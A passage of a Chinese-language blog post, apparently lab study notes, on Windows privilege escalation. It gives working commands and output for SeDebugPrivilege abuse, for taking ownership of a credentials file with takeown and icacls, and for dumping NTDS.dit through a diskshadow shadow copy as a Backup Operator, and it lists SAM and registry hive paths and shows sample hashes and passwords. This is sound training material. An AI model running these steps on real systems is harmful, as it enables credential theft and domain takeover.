class="title">User</span> <span class="title">Name</span>         : <span class="title">jordan</span></span></span><br><span class="line"><span class="function"><span class="title">Domain</span>            : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Server</span>      : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Time</span>        : 3/31/2021 2:59:52 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">SID</span>               : <span class="title">S</span>-1-5-21-3769161915-3336846931-3985975925-1000</span></span><br><span class="line"><span class="function">        <span class="title">msv</span> :</span></span><br><span class="line"><span class="function">         [00000003] <span class="title">Primary</span></span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">jordan</span></span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function">         * <span class="title">NTLM</span>     : <span class="title">cf3a5525ee9414229e66279623ed5c58</span></span></span><br><span class="line"><span class="function">         * <span class="title">SHA1</span>     : 3<span class="title">c7374127c9a60f9e5b28d3a343eb7ac972367b2</span></span></span><br><span class="line"><span class="function">        <span class="title">tspkg</span> :</span></span><br><span class="line"><span class="function">        <span class="title">wdigest</span> :</span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">jordan</span></span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function">         * <span class="title">Password</span> : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function">        <span class="title">kerberos</span> :</span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">jordan</span></span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function">         * <span class="title">Password</span> : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function">        <span class="title">ssp</span> :</span></span><br><span class="line"><span class="function">        <span class="title">credman</span> :</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还可以利用 SeDebugPrivilege 进行 RCE。使用这种技术，可以启动子进程并使用通过 SeDebugPrivilege 授予帐户的提升权限来更改正常系统行为，从而将权限提升到 SYSTEM，以继承父进程的令牌并模拟它。</p><p>输入用户凭证，以管理员身份运行 Powershell，获取正在运行的进程 PID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; tasklist</span><br><span class="line"></span><br><span class="line">Image Name                     PID Session Name        Session<span class="comment">#    Mem Usage</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle <span class="keyword">Process</span>              <span class="number">0</span> Services                   <span class="number">0</span>          <span class="number">4</span> K</span><br><span class="line">System                           <span class="number">4</span> Services                   <span class="number">0</span>        <span class="number">116</span> K</span><br><span class="line">smss.exe                       <span class="number">340</span> Services                   <span class="number">0</span>      <span class="number">1</span>,<span class="number">212</span> K</span><br><span class="line">csrss.exe                      <span class="number">444</span> Services                   <span class="number">0</span>      <span class="number">4</span>,<span class="number">696</span> K</span><br><span class="line">wininit.exe                    <span class="number">548</span> Services                   <span class="number">0</span>      <span class="number">5</span>,<span class="number">240</span> K</span><br><span class="line">csrss.exe                      <span class="number">556</span> Console                    <span class="number">1</span>      <span class="number">5</span>,<span class="number">972</span> K</span><br><span class="line">winlogon.exe                   <span class="number">612</span> Console                    <span class="number">1</span>     <span class="number">10</span>,<span class="number">408</span> K</span><br></pre></td></tr></table></figure><p>Command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,&quot;&quot;)</span><br></pre></td></tr></table></figure><p>这里定位<code>winlogon.exe</code>在 PID 612 下运行，它在 Windows 主机上以 SYSTEM 身份运行。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731559504527.png" alt="psgetsys_winlogon"></p><p>还可以使用 Get-Process cmdlet 来获取以 SYSTEM 身份运行的进程（例如 LSASS）的 PID</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731559510936.png" alt="psgetsys_lsass"></p><h2 id="SeTakeOwnershipPrivilege"><a href="#SeTakeOwnershipPrivilege" class="headerlink" title="SeTakeOwnershipPrivilege"></a>SeTakeOwnershipPrivilege</h2><p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">SeTakeOwnershipPrivilege</a> 授予用户 “可保护对象” 的能力，这些对象包括 Active Directory 对象、NTFS 文件&#x2F;文件夹、打印机、注册表项、服务和进程。此权限分配对象的 WRITE_OWNER 权限，这意味着用户可以在对象的安全描述符中更改所有者。默认情况下，管理员被分配此权限。</p><p>凭借此权限，用户可以拥有任何文件或对象的所有权，并进行可能涉及访问敏感数据、远程代码执行 (RCE) 或拒绝服务 (DOS) 的更改。</p><p>在组策略中设置此设置：<code>Computer Configuration</code> ⇾ <code>Windows Settings</code> ⇾ <code>Security Settings</code> ⇾ <code>Local Policies</code> ⇾ <code>User Rights Assignment</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731564633098.png" alt="setakeowner2"></p><p>假设遇到具有此权限的用户，或者通过使用<a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a>的 GPO 滥用等攻击将其分配给他们。在这种情况下，可以使用此权限来控制共享文件夹或敏感文件，例如包含密码或 SSH 密钥的文档。</p><p><strong>exploit</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>                          Disabled</span><br></pre></td></tr></table></figure><p>从输出中可以看出，权限未启用。使用 <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">EnableAllTokenPrivs.ps1 </a> 开启 <code>SeTakeOwnershipPrivilege</code> 权限。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>           Enabled</span><br></pre></td></tr></table></figure><p>假设用户帐户具有 SeTakeOwnershipPrivilege（可能已被授予），或者利用其他一些错误配置（例如过于宽松的组策略对象 (GPO) 向用户帐户授予该权限），可以利用它来读取选择的任何文件。</p><blockquote><p>注意：执行可能造成破坏的操作（例如更改文件所有权）时要格外小心，因为这可能会导致应用程序停止工作或扰乱目标对象的用户。此外，更改隐藏在多个子目录中的文件的所有权（同时更改每个子目录的权限）可能很难恢复，因此应避免这样做。</p></blockquote><p>查看文件所有者</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">Select</span> Fullname,LastWriteTime,Attributes,<span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123; (<span class="built_in">Get-Acl</span> <span class="variable">$_</span>.FullName).Owner &#125;&#125;</span><br><span class="line"> </span><br><span class="line">FullName                                 LastWriteTime         Attributes Owner</span><br><span class="line"><span class="literal">--------</span>                                 <span class="literal">-------------</span>         <span class="literal">----------</span> <span class="literal">-----</span></span><br><span class="line">C:\Department Shares\Private\IT\cred.txt <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">23</span>:<span class="number">28</span> PM    Archive</span><br></pre></td></tr></table></figure><p>没有显示所有者，这意味着可能没有足够的权限查看该对象的详细信息。可以后退一点并查看 IT 目录的所有者。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is <span class="number">0</span>C92<span class="literal">-675B</span></span><br><span class="line"> </span><br><span class="line"> Directory of C:\Department Shares\Private\IT</span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  .</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">36</span> bytes</span><br><span class="line">               <span class="number">2</span> <span class="built_in">Dir</span>(s)  <span class="number">17</span>,<span class="number">079</span>,<span class="number">754</span>,<span class="number">752</span> bytes free</span><br></pre></td></tr></table></figure><p>IT 共享似乎由服务帐户拥有，并且确实包含一个<code>cred.txt</code>数据的文件。</p><p>使用 <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> 来更改文件的所有权。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br><span class="line"> </span><br><span class="line">SUCCESS: The file (or folder): <span class="string">&quot;C:\Department Shares\Private\IT\cred.txt&quot;</span> now owned by user <span class="string">&quot;WINLPE-SRV01\htb-student&quot;</span>.</span><br></pre></td></tr></table></figure><p>仍然无法读取该文件，需要使用<code>icacls</code>修改文件 ACL 才能读取它。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant \htb<span class="literal">-student</span>:F</span><br><span class="line"></span><br><span class="line">processed file: C:\Department Shares\Private\IT\cred.txt</span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">NIX01 admin</span><br><span class="line"> </span><br><span class="line">root:n1X_p0wer_us3er!</span><br></pre></td></tr></table></figure><p>其他的一些敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure><hr><h1 id="Group-Privileges"><a href="#Group-Privileges" class="headerlink" title="Group Privileges"></a>Group Privileges</h1><h2 id="Built-in-Groups"><a href="#Built-in-Groups" class="headerlink" title="Built-in Groups"></a>Built-in Groups</h2><p>Windows 服务器（尤其是域控制器）具有各种内置组，这些组要么随操作系统一起提供，要么在系统上安装 Active Directory 域服务角色以将服务器提升为域控制器时添加。</p><p>所有内置 Windows 组的列表以及每个组的详细描述：<a href="https://ss64.com/nt/syntax-security_groups.html">https://ss64.com/nt/syntax-security_groups.html</a></p><p>Active Directory 中的特权帐户和组：<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory</a></p><table><thead><tr><th>Windows</th><th>Built-in</th><th>Groups</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators">Backup Operators</a></td><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders">Event Log Readers</a></td><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">DnsAdmins</a></td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators">Hyper-V Administrators</a></td><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators">Print Operators</a></td><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators">Server Operators</a></td></tr></tbody></table><h3 id="Backup-Operators"><a href="#Backup-Operators" class="headerlink" title="Backup Operators"></a>Backup Operators</h3><p><code>Backup Operators</code> 组授予其成员 <code>SeBackup</code> 和 <code>SeRestore</code> 权限。<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges">SeBackupPrivilege</a> 允许遍历任何文件夹并列出文件夹内容，但是不能使用标准复制命令来执行此操作。</p><p>如果 SeBackupPrivilege 权限被禁用，可以使用 Set-SeBackupPrivilege 来启用。</p><blockquote><p>注意：根据服务器的设置，可能需要生成提升的 CMD 提示以绕过 UAC 并获得此权限。</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Disabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Disabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Disabled</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line"></span><br><span class="line">SeBackupPrivilege is disabled</span><br></pre></td></tr></table></figure><p>导入模块 <a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilegeUtils</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br></pre></td></tr></table></figure><p>启用 <code>SeBackupPrivilege</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-SeBackupPrivilege</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line"></span><br><span class="line">SeBackupPrivilege is enabled</span><br></pre></td></tr></table></figure><h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><p>现在可以利用此权限复制任何受保护的文件。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> <span class="string">&#x27;C:\Confidential\2021 Contract.txt&#x27;</span> .\Contract.txt</span><br><span class="line"></span><br><span class="line">Copied <span class="number">88</span> bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">cat</span> .\Contract.txt</span><br><span class="line"></span><br><span class="line">Inlanefreight <span class="number">2021</span> Contract</span><br><span class="line"></span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">Board of Directors:</span><br><span class="line"></span><br><span class="line">&lt;...SNIP...&gt;</span><br></pre></td></tr></table></figure><p>Windows 内置实用程序<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy">robocopy</a>也可用于在备份模式下复制文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">robocopy</span> /<span class="title">B</span> <span class="title">E</span>:\<span class="title">Windows</span>\<span class="title">NTDS</span> .\<span class="title">ntds</span> <span class="title">ntds.dit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function">   <span class="title">ROBOCOPY</span>     ::     <span class="title">Robust</span> <span class="title">File</span> <span class="title">Copy</span> <span class="title">for</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Started</span> : <span class="title">Thursday</span>, <span class="title">May</span> 6, 2021 1:11:47 <span class="title">PM</span></span></span><br><span class="line"><span class="function">   <span class="title">Source</span> : <span class="title">E</span>:\<span class="title">Windows</span>\<span class="title">NTDS</span>\</span></span><br><span class="line"><span class="function">     <span class="title">Dest</span> : <span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">ntds</span>\</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">Files</span> : <span class="title">ntds.dit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Options</span> : /<span class="title">DCOPY:DA</span> /<span class="title">COPY:DAT</span> /<span class="title">B</span> /<span class="title">R</span>:1000000 /<span class="title">W</span>:30</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">          <span class="title">New</span> <span class="title">Dir</span>          1    <span class="title">E</span>:\<span class="title">Windows</span>\<span class="title">NTDS</span>\</span></span><br><span class="line"><span class="function">100%        <span class="title">New</span> <span class="title">File</span>              16.0 <span class="title">m</span>        <span class="title">ntds.dit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">               <span class="title">Total</span>    <span class="title">Copied</span>   <span class="title">Skipped</span>  <span class="title">Mismatch</span>    <span class="title">FAILED</span>    <span class="title">Extras</span></span></span><br><span class="line"><span class="function">    <span class="title">Dirs</span> :         1         1         0         0         0         0</span></span><br><span class="line"><span class="function">   <span class="title">Files</span> :         1         1         0         0         0         0</span></span><br><span class="line"><span class="function">   <span class="title">Bytes</span> :   16.00 <span class="title">m</span>   16.00 <span class="title">m</span>         0         0         0         0</span></span><br><span class="line"><span class="function">   <span class="title">Times</span> :   0:00:00   0:00:00                       0:00:00   0:00:00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   <span class="title">Speed</span> :           356962042 <span class="title">Bytes</span>/<span class="title">sec</span>.</span></span><br><span class="line"><span class="function">   <span class="title">Speed</span> :           20425.531 <span class="title">MegaBytes</span>/<span class="title">min</span>.</span></span><br><span class="line"><span class="function">   <span class="title">Ended</span> : <span class="title">Thursday</span>, <span class="title">May</span> 6, 2021 1:11:47 <span class="title">PM</span></span></span><br></pre></td></tr></table></figure><h4 id="转储-NTDS-dit"><a href="#转储-NTDS-dit" class="headerlink" title="转储 NTDS.dit"></a>转储 NTDS.dit</h4><p>该组还允许本地登录域控制器。活动目录数据库<code>NTDS.dit</code>是一个非常有吸引力的目标，因为它包含域中所有用户和计算机对象的 NTLM 哈希。但是，此文件已锁定，非特权用户也无法访问。</p><p><code>NTDS.dit</code>文件默认处于锁定状态，可以使用 Windows <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a>实用程序创建<code>C</code>驱动器的卷影副本并将其公开为<code>E</code>驱动器。此卷影副本中的 NTDS.dit 将不会被系统使用。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; diskshadow.exe</span><br><span class="line"></span><br><span class="line">Microsoft DiskShadow version <span class="number">1.0</span></span><br><span class="line">Copyright (C) <span class="number">2013</span> Microsoft Corporation</span><br><span class="line">On computer:  DC,  <span class="number">10</span>/<span class="number">14</span>/<span class="number">2020</span> <span class="number">12</span>:<span class="number">57</span>:<span class="number">52</span> AM</span><br><span class="line"></span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> verbose on</span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> metadata C:\Windows\Temp\meta.cab</span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> context clientaccessible</span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> context persistent</span><br><span class="line">DISKSHADOW&gt; <span class="keyword">begin</span> backup</span><br><span class="line">DISKSHADOW&gt; add volume C: alias cdrive</span><br><span class="line">DISKSHADOW&gt; create</span><br><span class="line">DISKSHADOW&gt; expose %cdrive% E:</span><br><span class="line">DISKSHADOW&gt; <span class="keyword">end</span> backup</span><br><span class="line">DISKSHADOW&gt; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span> E:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: E:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">6</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">00</span> PM                Confidential</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">9</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">12</span>:<span class="number">19</span> AM                PerfLogs</span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">3</span>/<span class="number">24</span>/<span class="number">2021</span>   <span class="number">6</span>:<span class="number">20</span> PM                Program Files</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">9</span>/<span class="number">15</span>/<span class="number">2018</span>   <span class="number">2</span>:<span class="number">06</span> AM                Program Files (x86)</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">6</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">05</span> PM                Tools</span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">5</span>/<span class="number">6</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">51</span> PM                Users</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">3</span>/<span class="number">24</span>/<span class="number">2021</span>   <span class="number">6</span>:<span class="number">38</span> PM                Windows</span><br></pre></td></tr></table></figure><p><a href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilegeUtils</a> - Copy-FileSeBackupPrivilege 转储 NTDS.dit</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit</span><br><span class="line"></span><br><span class="line">Copied <span class="number">16777216</span> bytes</span><br></pre></td></tr></table></figure><h4 id="备份-SAM-和-SYSTEM-注册表配置单元"><a href="#备份-SAM-和-SYSTEM-注册表配置单元" class="headerlink" title="备份 SAM 和 SYSTEM 注册表配置单元"></a>备份 SAM 和 SYSTEM 注册表配置单元</h4><p>该权限还允许备份 SAM 和 SYSTEM 注册表配置单元，可以使用 Impacket <code>secretsdump.py</code> 